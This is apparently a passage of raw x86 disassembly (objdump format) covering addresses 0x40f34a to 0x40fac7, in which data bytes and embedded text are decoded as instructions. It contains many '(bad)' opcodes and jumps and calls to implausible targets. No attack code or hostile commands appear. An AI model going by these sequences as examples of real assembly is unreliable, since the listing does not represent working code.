  40f34a:	and    BYTE PTR [edx],cl
  40f34c:	jns    0x40f37c
  40f34e:	cs jb  0x40f3b6
  40f351:	or     ch,BYTE PTR [ecx+0x6d]
  40f354:	outs   dx,DWORD PTR ds:[esi]
  40f355:	cmp    al,0x53
  40f357:	ins    DWORD PTR es:[edi],dx
  40f358:	imul   esp,DWORD PTR [ecx+0x6b],0x79
  40f35c:	jne    0x40f3bf
  40f35e:	popa   
  40f35f:	jae    0x40f3ae
  40f361:	ins    DWORD PTR es:[edi],dx
  40f362:	and    BYTE PTR [ebx+0x65],dh
  40f365:	jne    0x40f389
  40f367:	jae    0x40f3ce
  40f369:	ins    DWORD PTR es:[edi],dx
  40f36a:	inc    esp
  40f36b:	das    
  40f36c:	jo     0x40f3d4
  40f36e:	push   edi
  40f36f:	push   edi
  40f370:	jae    0x40f3d9
  40f372:	and    BYTE PTR [edi+0x53],ch
  40f375:	arpl   WORD PTR [edi],bp
  40f377:	cs push edi
  40f379:	inc    ecx
  40f37a:	inc    ecx
  40f37b:	push   ebx
  40f37c:	outs   dx,BYTE PTR ds:[esi]
  40f37d:	data16 jbe 0x40f3d2
  40f380:	jb     0x40f3b0
  40f382:	jb     0x40f3c5
  40f384:	popa   
  40f385:	data16 jo 0x40f3fb
  40f388:	or     ch,BYTE PTR [esi+0x65]
  40f38b:	and    BYTE PTR [ecx+0x6d],ch
  40f38e:	gs or  eax,0x2f74656f
  40f394:	jne    0x40f3f8
  40f396:	or     ch,BYTE PTR [esi]
  40f398:	inc    ecx
  40f399:	mov    ebx,0xbbf4f8ee
  40f39e:	inc    ebp
  40f39f:	shl    BYTE PTR [ecx+ebx*4],0x39
  40f3a3:	(bad)  
  40f3a5:	jbe    0x40f36b
  40f3a7:	sub    eax,0x72b0a037
  40f3ac:	mov    ecx,DWORD PTR [ebx-0x745e2aa5]
  40f3b2:	mov    eax,eax
  40f3b4:	(bad)  
  40f3b7:	add    BYTE PTR [edx+0x42e46498],dl
  40f3bd:	shl    eax,1
  40f3bf:	jg     0x40f3b6
  40f3c1:	test   al,0x3b
  40f3c3:	lds    ebx,FWORD PTR [edi-0x30744874]
  40f3c9:	adc    bl,dh
  40f3cb:	outs   dx,DWORD PTR ds:[esi]
  40f3cc:	stc    
  40f3cd:	je     0x40f3f4
  40f3cf:	dec    eax
  40f3d0:	add    BYTE PTR [eax],al
  40f3d2:	add    BYTE PTR [ebp+0x75],dl
  40f3d5:	add    BYTE PTR [eax],al
  40f3d7:	jo     0x40f391
  40f3d9:	add    BYTE PTR [eax],al
  40f3db:	add    BYTE PTR [esp+eax*1],al
  40f3de:	add    al,0x4
  40f3e0:	add    al,0x4
  40f3e2:	add    al,0x4
  40f3e4:	add    al,0xcc
  40f3e6:	retf   0xc7ac
  40f3e9:	inc    edi
  40f3ea:	jbe    0x40f3ff
  40f3ec:	xchg   ebx,eax
  40f3ed:	shl    DWORD PTR ds:0x43f9c57d,0xee
  40f3f4:	or     ecx,DWORD PTR [esi-0x7f]
  40f3f7:	adc    eax,0x67692a15
  40f3fc:	mov    DWORD PTR [eax],eax
	...
  40f406:	add    al,0x4
  40f408:	enter  0xe216,0x8d
  40f40c:	add    al,0x4
  40f40e:	sti    
  40f40f:	inc    esi
  40f410:	sqrtps xmm4,XMMWORD PTR [ecx+0x47608df1]
  40f417:	cdq    
  40f418:	pop    edi
  40f419:	sub    eax,0x38140d00
  40f41e:	push   ecx
  40f41f:	mov    cl,0x53
  40f421:	cwd    
  40f423:	sbb    eax,0xc8050af8
  40f428:	cmp    al,0x10
  40f42a:	ret    0x2bd3
  40f42d:	jbe    0x40f439
  40f42f:	nop
  40f430:	mov    eax,DWORD PTR [esp+eax*1]
  40f433:	and    eax,0xed0404c3
  40f438:	pop    esp
  40f439:	icebp  
  40f43a:	add    al,0x83
  40f43c:	sbb    ah,cl
  40f43e:	cmp    DWORD PTR [edi-0x4f485fe5],0xc2aa2c68
  40f448:	fidiv  DWORD PTR [edx-0x4d]
  40f44b:	call   FWORD PTR [esi+edi*2-0x5e]
  40f44f:	clc    
  40f450:	mov    eax,ds:0x83161795
  40f455:	add    DWORD PTR [ebx+0xe8e3a0e],0x15
  40f45c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f45d:	or     bh,ah
  40f45f:	js     0x40f3fb
  40f461:	lahf   
  40f462:	in     eax,dx
  40f463:	test   eax,0x1111cd71
  40f468:	xor    dh,BYTE PTR [ebp+0x3da1f2b2]
  40f46e:	add    BYTE PTR [ecx+eiz*4-0x38],bl
  40f472:	mov    eax,ds:0x2d8383e7
  40f477:	cmp    dh,bh
  40f479:	add    DWORD PTR [ebx-0x7a7a7a7d],0xffffff85
  40f480:	test   DWORD PTR [ebp-0x2c7a7a7b],eax
  40f486:	and    DWORD PTR [ecx+0x8],edi
  40f489:	or     BYTE PTR [eax],cl
  40f48b:	or     BYTE PTR [eax],cl
  40f48d:	or     BYTE PTR [eax],cl
  40f48f:	or     BYTE PTR [eax],cl
  40f491:	xor    esi,DWORD PTR [ebx]
  40f493:	jno    0x40f4f6
  40f495:	dec    ebp
  40f496:	std    
  40f497:	mov    ebx,0xa5a8f846
  40f49c:	xor    eax,edi
  40f49e:	inc    ebp
  40f49f:	cli    
  40f4a0:	xchg   ebx,eax
  40f4a1:	mov    ebp,edx
  40f4a3:	loopne 0x40f461
  40f4a5:	cmp    DWORD PTR [edi+0x3d7191d5],eax
  40f4ab:	xor    esi,DWORD PTR [ebx]
  40f4ad:	inc    ecx
  40f4ae:	div    DWORD PTR [ebx]
  40f4b0:	xor    edx,DWORD PTR [edi+0x2633330c]
  40f4b6:	aad    0xc2
  40f4b8:	cmp    eax,0x57d40aa6
  40f4bd:	or     eax,0xa0e0f3df
  40f4c2:	scas   al,BYTE PTR es:[edi]
  40f4c3:	jne    0x40f4b1
  40f4c5:	fist   DWORD PTR [edi+0x58]
  40f4c8:	cmp    esi,DWORD PTR [ecx+0x33d11de9]
  40f4ce:	je     0x40f460
  40f4d0:	and    BYTE PTR [ecx+0x74747499],bl
  40f4d6:	jmp    0x8b3ac9f1
  40f4db:	out    0xa,eax
  40f4dd:	mov    ebx,DWORD PTR ds:0xaf9c3adb
  40f4e3:	ja     0x40f4b1
  40f4e5:	sbb    cl,dh
  40f4e7:	xchg   esp,eax
  40f4e8:	loopne 0x40f560
  40f4ea:	jecxz  0x40f51c
  40f4ec:	cs loop 0x40f47d
  40f4ef:	(bad)  
  40f4f0:	test   al,0x38
  40f4f2:	stos   BYTE PTR es:[edi],al
  40f4f3:	ffreep st(7)
  40f4f5:	enter  0xde64,0x69
  40f4f9:	je     0x40f56f
  40f4fb:	mov    ch,0x42
  40f4fd:	je     0x40f573
  40f4ff:	je     0x40f501
	...
  40f509:	pop    ds
  40f50a:	pusha  
  40f50b:	outs   dx,DWORD PTR ds:[esi]
  40f50c:	(bad)  
  40f50d:	(bad)  
  40f50e:	(bad)  
  40f50f:	(bad)  
  40f510:	(bad)  
  40f511:	(bad)  
  40f512:	(bad)  
  40f513:	(bad)  
  40f514:	inc    DWORD PTR [eax]
  40f516:	add    BYTE PTR [eax],al
  40f518:	or     edx,esp
  40f51a:	pop    edi
  40f51b:	push   0xaacf5219
  40f520:	inc    edi
  40f521:	out    0x71,al
  40f523:	xchg   BYTE PTR [si-0x3909],ah
  40f528:	pop    edi
  40f529:	sbb    DWORD PTR [ebp-0x26],0x975720
  40f530:	add    BYTE PTR [edi+0x6436a346],cl
  40f536:	(bad)  
  40f537:	sahf   
  40f538:	adc    ebp,DWORD PTR [edx]
  40f53a:	mov    ds,WORD PTR [eax+0xe]
  40f53d:	leave  
  40f53e:	fimul  DWORD PTR [ecx]
  40f540:	jl     0x40f4e7
  40f542:	sub    al,0x43
  40f544:	lea    ebx,ds:[esi+0x4b]
  40f548:	ss mov eax,edi
  40f54b:	out    dx,al
  40f54c:	bound  ebp,QWORD PTR [ebx]
  40f54e:	add    BYTE PTR [eax],al
  40f550:	xor    eax,0x73fa
  40f555:	xchg   ebx,eax
  40f556:	scas   eax,DWORD PTR es:[edi]
  40f557:	enter  0x0,0xed
  40f55b:	icebp  
  40f55c:	fs cwde 
  40f55e:	ret    
  40f55f:	dec    ebp
  40f560:	sub    al,0x30
  40f562:	clc    
  40f563:	aaa    
  40f564:	push   eax
  40f565:	inc    esp
  40f566:	mov    edx,0x78a755fa
  40f56b:	xor    al,BYTE PTR [edi]
  40f56d:	das    
  40f56e:	xchg   BYTE PTR ds:0x647,ch
  40f574:	add    cl,ah
  40f576:	sub    al,BYTE PTR [eax]
  40f578:	add    BYTE PTR [ebx+eax*1+0x0],al
  40f57c:	add    BYTE PTR [eax],al
  40f57e:	(bad)  
  40f57f:	(bad)  
  40f580:	(bad)  
  40f581:	(bad)  
  40f582:	(bad)  
  40f583:	(bad)  
  40f584:	(bad)  
  40f585:	(bad)  
  40f586:	(bad)  
  40f587:	fld    DWORD PTR [ecx+0x5f]
  40f58a:	pop    ebp
  40f58b:	lods   eax,DWORD PTR ds:[esi]
  40f58c:	clc    
  40f58d:	sub    DWORD PTR [edx],esp
  40f58f:	xor    al,0x9d
  40f591:	xor    edx,DWORD PTR [esi-0x586ea09d]
  40f597:	push   es
  40f598:	in     eax,dx
  40f599:	inc    edi
  40f59a:	sub    al,0x88
  40f59c:	shl    DWORD PTR ds:0xcccccc2d,cl
  40f5a2:	int3   
  40f5a3:	int3   
  40f5a4:	int3   
  40f5a5:	int3   
  40f5a6:	int3   
  40f5a7:	int3   
  40f5a8:	jne    0x40f61f
  40f5aa:	mov    BYTE PTR [ecx+0x75755dd0],ch
  40f5b0:	xchg   ecx,eax
  40f5b1:	jnp    0x40f5a1
  40f5b3:	leave  
  40f5b4:	push   edx
  40f5b5:	or     DWORD PTR [ebx],eax
  40f5b7:	cld    
  40f5b8:	and    al,0x8b
  40f5ba:	dec    ebp
  40f5bb:	shl    DWORD PTR [edx-0x72],cl
  40f5be:	call   0x219d:0x72ca901c
  40f5c5:	lea    ebx,[ebx+0x68]
  40f5c8:	mov    ds:0xd376ea21,al
  40f5cd:	popa   
  40f5ce:	enter  0x1e91,0xda
  40f5d2:	dec    eax
  40f5d3:	jne    0x40f64a
  40f5d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5d6:	dec    ecx
  40f5d7:	jne    0x40f64e
  40f5d9:	xlat   BYTE PTR ds:[ebx]
  40f5da:	mov    eax,DWORD PTR [ebp+esi*2+0x0]
  40f5de:	or     eax,0x10e721af
  40f5e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5e4:	mov    ds:0x85496114,eax
  40f5e9:	(bad)  
  40f5ea:	(bad)  
  40f5eb:	in     al,0x47
  40f5ed:	stos   DWORD PTR es:[edi],eax
  40f5ee:	mov    ds:0x14c4b604,al
  40f5f3:	pusha  
  40f5f4:	inc    ebp
  40f5f5:	imul   eax,DWORD PTR [eax],0x0
  40f5f8:	add    BYTE PTR [esi],bh
  40f5fa:	retf   0x2cd4
  40f5fd:	and    ebp,DWORD PTR [ebp+0x10926746]
  40f603:	mov    esi,0xcd203d93
  40f608:	jmp    0xc66e:0xde704c5b
  40f60f:	mov    bl,0x8f
  40f611:	sbb    cl,BYTE PTR [ebp-0x43]
  40f614:	out    0x3e,eax
  40f616:	add    BYTE PTR [eax],al
  40f618:	adc    DWORD PTR [ebx+0x3d],eax
  40f61b:	add    BYTE PTR [eax],al
  40f61d:	add    BYTE PTR [ebp-0x72727273],cl
  40f623:	lea    ecx,[ebp-0x730b7273]
  40f629:	(bad)  
  40f62a:	call   0xe929df17
  40f62f:	call   0x129df1c
  40f634:	add    BYTE PTR [esi+0x2a],bh
  40f637:	xchg   esp,eax
  40f638:	fdiv   QWORD PTR [ebp-0x26]
  40f63b:	mov    eax,0xe6b071de
  40f640:	jne    0x40f65c
  40f642:	jo     0x40f667
  40f644:	daa    
  40f645:	mov    WORD PTR [eax-0x42],ds
  40f648:	scas   eax,DWORD PTR es:[edi]
  40f649:	sub    dl,ah
  40f64b:	mov    ds:0x30000c1,eax
  40f650:	ret    0x0
  40f653:	out    dx,al
  40f654:	fadd   DWORD PTR [eax]
  40f656:	add    ah,bh
  40f658:	mov    ecx,0x66824115
  40f65d:	outs   dx,DWORD PTR ds:[esi]
  40f65e:	jae    0x40f6c7
  40f660:	push   0x206d656d
  40f665:	ins    BYTE PTR es:[edi],dx
  40f666:	outs   dx,DWORD PTR ds:[esi]
  40f667:	or     bh,BYTE PTR [esi]
  40f669:	popa   
  40f66a:	ins    DWORD PTR es:[edi],dx
  40f66b:	cmp    al,0x73
  40f66d:	push   ebx
  40f66e:	pop    ebp
  40f66f:	jae    0x40f69f
  40f671:	outs   dx,BYTE PTR gs:[esi]
  40f673:	and    BYTE PTR ds:[eax],ah
  40f676:	gs ins DWORD PTR es:[edi],dx
  40f678:	and    BYTE PTR [eax+0x41],dh
  40f67b:	arpl   WORD PTR [ebx+0x6d],si
  40f67e:	ins    DWORD PTR es:[edi],dx
  40f67f:	cmp    al,0x79
  40f681:	bound  eax,QWORD PTR [ecx+0x65]
  40f684:	jb     0x40f6e8
  40f686:	cmp    al,0x69
  40f688:	outs   dx,DWORD PTR ds:[esi]
  40f689:	outs   dx,DWORD PTR ds:[esi]
  40f68a:	gs or  eax,0x62696f3c
  40f690:	jae    0x40f706
  40f692:	push   edx
  40f693:	jo     0x40f6e8
  40f695:	jo     0x40f6da
  40f697:	push   ebx
  40f698:	and    BYTE PTR [ebp+0x53],ch
  40f69b:	ins    DWORD PTR es:[edi],dx
  40f69c:	popa   
  40f69d:	inc    ecx
  40f69e:	jo     0x40f702
  40f6a0:	imul   esp,DWORD PTR [eax],0x6d2e6964
  40f6a6:	jbe    0x40f720
  40f6a8:	jb     0x40f70f
  40f6aa:	and    BYTE PTR [ebp+0x68],cl
  40f6ad:	gs cmp al,0x20
  40f6b0:	gs or  ax,0x616d
  40f6b5:	dec    edi
  40f6b6:	jb     0x40f6d8
  40f6b8:	jbe    0x40f72e
  40f6ba:	ins    DWORD PTR es:[edi],dx
  40f6bb:	cs or  eax,0x72726964
  40f6c1:	and    BYTE PTR [esi],ch
  40f6c3:	push   esp
  40f6c4:	jb     0x40f719
  40f6c6:	dec    ebp
  40f6c7:	cs push ebx
  40f6c9:	imul   ebp,DWORD PTR [edi+0xd],0x65206520
  40f6d0:	and    BYTE PTR [ecx+0x67],bh
  40f6d3:	je     0x40f73a
  40f6d5:	jb     0x40f705
  40f6d7:	arpl   WORD PTR [edi+0x6d],sp
  40f6da:	push   ebp
  40f6db:	mov    edi,0x55577cb2
  40f6e0:	push   DWORD PTR [edi+0x3f]
  40f6e3:	test   BYTE PTR [edi+0x7d69f946],0x2c
  40f6ea:	mov    ebx,0xe800467a
  40f6ef:	pusha  
  40f6f0:	add    bh,dh
  40f6f2:	sti    
  40f6f3:	call   0x40fbdfe0
  40f6f8:	je     0x40f6fc
  40f6fa:	inc    ecx
  40f6fb:	add    edx,DWORD PTR es:[esi-0x1a9bee62]
  40f702:	sub    ebx,DWORD PTR [ebp-0x53]
  40f705:	mov    ah,0x2e
  40f707:	jge    0x40f77d
  40f709:	dec    ecx
  40f70a:	add    al,0xf8
  40f70c:	fbld   TBYTE PTR [edi]
  40f70e:	mov    ebx,0xed582fa3
  40f713:	or     bh,al
  40f715:	jge    0x40f72c
  40f717:	mov    ds:0x55e8e8f1,al
  40f71c:	stc    
  40f71d:	call   0x74b5e00a
  40f722:	je     0x40f798
  40f724:	je     0x40f79a
  40f726:	je     0x40f79c
  40f728:	je     0x40f765
  40f72a:	clc    
  40f72b:	cmc    
  40f72c:	test   DWORD PTR [ebp-0x7a7a7a7b],eax
  40f732:	test   DWORD PTR [ebp+0x2f000085],eax
  40f738:	jle    0x40f742
  40f73a:	sub    eax,DWORD PTR [esi]
  40f73c:	mov    ds:0x175890a5,al
  40f741:	xchg   ebp,eax
  40f742:	aaa    
  40f743:	rcr    BYTE PTR [edi+ebx*8],cl
  40f746:	test   BYTE PTR [ebx],ah
  40f748:	push   edi
  40f749:	retf   
  40f74a:	das    
  40f74b:	sub    ebx,ebx
  40f74d:	test   BYTE PTR [edi+0x0],dh
  40f750:	add    BYTE PTR [edi],bh
  40f752:	pusha  
  40f753:	sar    ebx,1
  40f755:	mov    eax,ds:0xc50e6c0b
  40f75a:	fistp  DWORD PTR [ebp+0x471d0f10]
  40f760:	bound  ecx,QWORD PTR [edi]
  40f762:	mov    BYTE PTR [esi+0x1208635d],ch
  40f768:	and    al,0x51
  40f76a:	(bad)
  40f76e:	add    BYTE PTR [eax],al
  40f770:	test   BYTE PTR [ebx+0x7],0x0
  40f774:	add    BYTE PTR [ebx+0xde0b],al
  40f77a:	mov    al,0x7
  40f77c:	pop    ebp
  40f77d:	or     ah,BYTE PTR [eax+0x33]
  40f780:	js     0x40f721
  40f782:	adc    esp,DWORD PTR [ecx+0x33]
  40f785:	adc    bh,0x71
  40f788:	inc    ebx
  40f789:	pop    esi
  40f78a:	in     al,dx
  40f78b:	xor    al,0xd4
  40f78d:	aam    0xbd
  40f78f:	mov    eax,ds:0x966b
  40f794:	add    BYTE PTR [eax+0x76000000],dl
  40f79a:	jnp    0x40f79c
  40f79c:	add    BYTE PTR [eax],al
  40f79e:	add    DWORD PTR [ebx-0x7c7c7c7d],0xffffff83
  40f7a5:	add    DWORD PTR [ebx+0x4c3765cc],0x56
  40f7ac:	push   esi
  40f7ad:	cmc    
  40f7ae:	imul   edi,esi,0x70028d0d
  40f7b4:	or     ebx,DWORD PTR [eax-0x46]
  40f7b7:	gs pushf 
  40f7b9:	cmp    DWORD PTR [ebx],ebx
  40f7bb:	fsubr  st(4),st
  40f7bd:	scas   al,BYTE PTR es:[edi]
  40f7be:	shr    al,0xe8
  40f7c1:	call   0xe929e0ae
  40f7c6:	call   0x1701b8b3
  40f7cb:	dec    ebx
  40f7cc:	cmp    ebx,DWORD PTR [edi-0x41183f40]
  40f7d2:	imul   ecx,DWORD PTR [ecx+edi*8+0x71c90bee],0x88ab9d2d
  40f7dd:	jge    0x40f83b
  40f7df:	xlat   BYTE PTR ds:[ebx]
  40f7e0:	daa    
  40f7e1:	popf   
  40f7e2:	pop    esp
  40f7e3:	ins    BYTE PTR es:[edi],dx
  40f7e4:	mov    BYTE PTR [ebp-0x76],0x6d
  40f7e8:	daa    
  40f7e9:	pop    esp
  40f7ea:	retf   0xed8b
  40f7ed:	iret   
  40f7ee:	rcr    BYTE PTR [ebx],cl
  40f7f0:	xor    ecx,ecx
  40f7f2:	inc    al
  40f7f4:	shl    BYTE PTR [edx-0x51],0xc0
  40f7f8:	rol    BYTE PTR [esi+ebp*8+0x630fc0ab],0xa8
  40f800:	sbb    cl,ah
  40f802:	arpl   si,si
  40f804:	or     DWORD PTR [ebx+0x4479f094],esp
  40f80a:	xchg   DWORD PTR [eax-0x4b036bf1],esp
  40f810:	adc    al,0xf6
  40f812:	cmp    DWORD PTR [edx+ebp*4+0x30],ecx
  40f816:	(bad)  
  40f817:	(bad)  
  40f818:	cmova  eax,ecx
  40f81b:	jmp    0x1b596c57
  40f820:	iret   
  40f821:	nop
  40f822:	scas   eax,DWORD PTR es:[edi]
  40f823:	xor    dh,BYTE PTR [ebx-0x5e]
  40f826:	sbb    esp,DWORD PTR [ebx-0x80]
  40f829:	mov    BYTE PTR [ebp+edx*1-0x50],ah
  40f82d:	xor    DWORD PTR [ecx-0x77c8866c],0xfe6e378
  40f837:	setno  cl
  40f83a:	cmp    eax,0xe80f0f0f
  40f83f:	call   0xe929e12c
  40f844:	call   0xaebee131
  40f849:	fdiv   st(7),st
  40f84b:	(bad)  
  40f84c:	(bad)  
  40f84d:	(bad)  
  40f84e:	(bad)  
  40f84f:	(bad)  
  40f850:	(bad)  
  40f851:	(bad)  
  40f852:	(bad)  
  40f853:	(bad)  
  40f854:	dec    DWORD PTR [ebp+0x46ca2cac]
  40f85a:	in     al,dx
  40f85b:	fst    DWORD PTR [eax+0x4a]
  40f85e:	(bad)  
  40f85f:	mov    eax,0x6c3181b5
  40f864:	jo     0x40f8e2
  40f866:	stos   BYTE PTR es:[edi],al
  40f867:	mov    dl,BYTE PTR [ecx+0x277f243c]
  40f86d:	(bad)  
  40f86e:	(bad)  
  40f86f:	mov    esp,0x12ffffd8
  40f874:	inc    edi
  40f875:	(bad)  
  40f876:	dec    DWORD PTR [esi-0x28]
  40f879:	scas   eax,DWORD PTR es:[edi]
  40f87a:	adc    al,0xd1
  40f87c:	pop    edi
  40f87d:	sub    DWORD PTR [ebp-0x63],0x54
  40f881:	or     al,0x6
  40f883:	mul    al
  40f885:	jl     0x40f882
  40f887:	xchg   edx,eax
  40f888:	mul    ch
  40f88a:	loop   0x40f8b3
  40f88c:	and    DWORD PTR [esp+edi*4],ebx
  40f88f:	inc    DWORD PTR [eax]
  40f891:	les    esp,FWORD PTR [ebp+0x1b]
  40f894:	jp     0x40f896
  40f896:	add    BYTE PTR [eax],al
  40f898:	sahf   
  40f899:	clc    
  40f89a:	lods   eax,DWORD PTR ds:[esi]
  40f89b:	movsx  esi,BYTE PTR [ecx+0x2b]
  40f89f:	cwde   
  40f8a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8a1:	xor    bh,bl
  40f8a3:	dec    DWORD PTR [esi+ebx*8+0x18]
  40f8a7:	xchg   esp,eax
  40f8a8:	pop    esp
  40f8a9:	inc    ebp
  40f8aa:	push   eax
  40f8ab:	call   0xb278:0x777d6f48
  40f8b2:	ss leave 
  40f8b4:	idiv   DWORD PTR [edx-0x64]
  40f8b7:	mov    eax,ds:0xdac5a8
  40f8bc:	add    BYTE PTR [edx-0x15],dl
  40f8bf:	add    BYTE PTR [eax],al
  40f8c1:	add    BYTE PTR [edx+0x6a],ch
  40f8c4:	push   0x6a
  40f8c6:	push   0x6a
  40f8c8:	push   0x6a
  40f8ca:	push   0x5c
  40f8cc:	js     0x40f8bf
  40f8ce:	je     0x40f944
  40f8d0:	je     0x40f946
  40f8d2:	je     0x40f948
  40f8d4:	je     0x40f94a
  40f8d6:	je     0x40f8dc
  40f8d8:	add    al,0xa6
  40f8da:	(bad)  
  40f8db:	push   ebp
  40f8dc:	mov    edx,0xac076add
  40f8e1:	ss enter 0x6fbb,0x5
  40f8e6:	mov    ebx,0x218c75fd
  40f8eb:	jmp    0x435:0xeb33cc59
  40f8f2:	add    al,0x75
  40f8f4:	outs   dx,BYTE PTR ds:[esi]
  40f8f5:	pop    ebp
  40f8f6:	pop    esi
  40f8f7:	loopne 0x40f8ef
  40f8f9:	push   0x39
  40f8fb:	push   edi
  40f8fc:	(bad)  
  40f8fd:	fcomp  QWORD PTR [eax]
  40f8ff:	or     BYTE PTR [ecx],bh
  40f901:	das    
  40f902:	jecxz  0x40f982
  40f904:	stos   BYTE PTR es:[edi],al
  40f905:	lea    eax,fs:[ecx]
  40f908:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f909:	mov    ds:0x10e5fc2f,eax
  40f90e:	or     ebx,DWORD PTR [ecx]
  40f910:	add    al,0x4
  40f912:	xchg   ebp,eax
  40f913:	jno    0x40f990
  40f915:	add    al,0x4
  40f917:	nop
  40f918:	aad    0xa
  40f91a:	add    al,0x8b
  40f91c:	fldenv [ecx-0x7f]
  40f91f:	rcr    edx,cl
  40f921:	and    DWORD PTR [ebx-0x38],edi
  40f924:	push   ebp
  40f925:	loopne 0x40f92e
  40f927:	push   esp
  40f928:	call   0x872:0xdb6fa667
  40f92f:	push   esp
  40f930:	out    0x3,eax
  40f932:	sub    eax,0x8b8b8b11
  40f937:	push   edx
  40f938:	mov    WORD PTR [ebx-0x743f7f75],cs
  40f93e:	mov    ecx,DWORD PTR [ebx+0x45454545]
  40f944:	inc    ebp
  40f945:	inc    ebp
  40f946:	inc    ebp
  40f947:	inc    ebp
  40f948:	inc    ebp
  40f949:	inc    ebp
  40f94a:	stos   BYTE PTR es:[edi],al
  40f94b:	and    ebx,DWORD PTR [ebp-0x11]
  40f94e:	add    eax,0xcd1070d4
  40f953:	mov    WORD PTR [edx],ds
  40f955:	jb     0x40f9b5
  40f957:	cmp    DWORD PTR [ebx+0x61],esi
  40f95a:	dec    esp
  40f95b:	cdq    
  40f95c:	aaa    
  40f95d:	push   edx
  40f95e:	xor    esp,DWORD PTR [eax-0x17171786]
  40f964:	call   0xe929e251
  40f969:	call   0xa9243eb3
  40f96e:	es mov ecx,0xa9bf4545
  40f974:	push   edi
  40f975:	int    0xa9
  40f977:	cmp    bl,bh
  40f979:	dec    ebp
  40f97a:	fld    st(7)
  40f97c:	pop    esp
  40f97d:	retf   
  40f97e:	pop    edi
  40f97f:	iret   
  40f980:	fnstenv [eax+0x2]
  40f983:	fxch   st(4)
  40f985:	popf   
  40f986:	mov    fs,WORD PTR ds:[eax+0x32]
  40f98a:	dec    ebx
  40f98b:	div    DWORD PTR [edx]
  40f98d:	pop    ecx
  40f98e:	dec    edx
  40f98f:	out    0x9b,al
  40f991:	and    DWORD PTR cs:[edi+0x24545e9],esi
  40f998:	fld    QWORD PTR [ebp+0x45]
  40f99b:	(bad)  es:[ecx+0x45]
  40f99f:	inc    ebp
  40f9a0:	outs   dx,DWORD PTR ds:[esi]
  40f9a1:	sbb    al,0xb7
  40f9a3:	aam    0xf2
  40f9a5:	jecxz  0x40fa0f
  40f9a7:	mov    edx,0xc215334d
  40f9ac:	inc    ebx
  40f9ad:	fwait
  40f9ae:	aad    0xb8
  40f9b0:	call   0x6314f9a1
  40f9b5:	push   esp
  40f9b6:	xchg   al,ah
  40f9b8:	inc    ebp
  40f9b9:	inc    ebp
  40f9ba:	inc    ebp
  40f9bb:	shr    BYTE PTR [eax],1
  40f9bd:	sub    DWORD PTR [esi],0xac48723d
  40f9c3:	ss pop eax
  40f9c5:	push   0xffffffdf
  40f9c7:	repz (bad) 
  40f9c9:	frstor [edx]
  40f9cb:	pop    ebp
  40f9cc:	sbb    esi,esi
  40f9ce:	add    DWORD PTR [eax+0x62],esp
  40f9d1:	mov    bl,ch
  40f9d3:	stos   DWORD PTR es:[edi],eax
  40f9d4:	or     cl,cl
  40f9d6:	repz pop ecx
  40f9d8:	inc    ebp
  40f9d9:	inc    ebp
  40f9da:	clc    
  40f9db:	jnp    0x40f97f
  40f9dd:	inc    ebp
  40f9de:	inc    ebp
  40f9df:	inc    ebp
	...
  40f9e8:	add    bh,ah
  40f9ea:	pop    edx
  40f9eb:	mov    ebp,0x0
  40f9f0:	add    BYTE PTR [eax],al
  40f9f2:	add    BYTE PTR [eax],al
  40f9f4:	add    BYTE PTR [ebx+0x50fa568b],cl
  40f9fa:	mov    esi,0x9381eabf
  40f9ff:	fisub  DWORD PTR [edi-0x58cdfe16]
  40fa05:	fild   WORD PTR [esi-0x37]
  40fa08:	mov    ds:0x961ed24c,eax
  40fa0d:	dec    edi
  40fa0e:	cmp    DWORD PTR [ebx-0x74546d75],ecx
  40fa14:	mov    ecx,eax
  40fa16:	mov    eax,0xa6488b8b
  40fa1b:	fbld   TBYTE PTR ds:0x2a905f74
  40fa21:	ret    
  40fa22:	xchg   ebx,eax
  40fa23:	into   
  40fa24:	repz pop edx
  40fa26:	neg    ah
  40fa28:	xor    BYTE PTR ds:0xdcf4ed20,cl
  40fa2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa2f:	mov    ebp,DWORD PTR [edi]
  40fa31:	mov    eax,DWORD PTR [eax]
  40fa33:	xor    DWORD PTR [eax+0x3d37],esi
  40fa39:	add    BYTE PTR [esi-0x79],ch
  40fa3c:	mov    ds:0xb65a2309,al
  40fa41:	(bad)  
  40fa42:	out    dx,al
  40fa43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa44:	cmp    eax,0xd8856ee
  40fa49:	fwait
  40fa4a:	(bad)
  40fa4f:	daa    
  40fa50:	push   0x210c45a7
  40fa55:	loop   0x40fa95
  40fa57:	and    edx,DWORD PTR [ebx+edx*4+0xa]
  40fa5b:	ja     0x40f9f9
  40fa5d:	add    BYTE PTR [eax],al
  40fa5f:	inc    edi
  40fa60:	xchg   ebp,eax
	...
  40fa6d:	dec    ebp
  40fa6e:	push   edi
  40fa6f:	aaa    
  40fa70:	inc    ebp
  40fa71:	inc    ebp
  40fa72:	inc    ebp
  40fa73:	inc    ebp
  40fa74:	inc    ebp
  40fa75:	inc    ebp
  40fa76:	inc    ebp
  40fa77:	inc    ebp
  40fa78:	inc    ebp
  40fa79:	(bad)  
  40fa7a:	(bad)  
  40fa7b:	(bad)  [edi]
  40fa7d:	imul   edi,DWORD PTR [ebp+esi*1+0x532e1849],0x69
  40fa85:	arpl   WORD PTR [ebp+0x2e],bp
  40fa88:	bound  esp,QWORD PTR gs:[eax]
  40fa8b:	gs inc ecx
  40fa8d:	or     eax,0x756c0d72
  40fa92:	jbe    0x40fafd
  40fa94:	or     eax,0x74654166
  40fa99:	gs sub al,0x70
  40fa9c:	jbe    0x40fac1
  40fa9e:	cs dec ecx
  40faa0:	imul   ebp,DWORD PTR [ebp+0x6f],0x74723c4d
  40faa7:	jb     0x40fb17
  40faa9:	jbe    0x40fb10
  40faab:	jae    0x40faba
  40faad:	jb     0x40faeb
  40faaf:	and    BYTE PTR [ecx+0x22],al
  40fab2:	and    ah,BYTE PTR [esi+ebp*1+0x6e]
  40fab6:	inc    esp
  40fab7:	bound  esp,QWORD PTR [ebx+0xd]
  40faba:	jb     0x40fafd
  40fabc:	imul   ecx,DWORD PTR [edx],0x6f787376
  40fac2:	ins    DWORD PTR es:[edi],dx
  40fac3:	and    BYTE PTR gs:[edx+0x6d],dh
  40fac7:	arpl   WORD PTR [esi+0x3a],bp
